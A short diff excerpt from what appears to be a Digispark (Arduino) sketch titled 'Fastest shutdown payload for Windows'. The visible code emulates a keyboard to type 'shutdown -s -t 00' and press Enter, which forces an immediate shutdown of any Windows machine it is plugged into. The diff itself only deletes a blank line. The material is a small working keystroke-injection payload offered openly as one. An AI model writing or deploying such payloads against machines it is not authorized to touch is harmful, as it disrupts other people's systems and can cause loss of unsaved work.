@@ -10,7 +10,6 @@ Fastest shutdown payload for Windows
     DigiKeyboard.print("shutdown -s -t 00");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
   }
-
   void loop() {
     //empty
   }
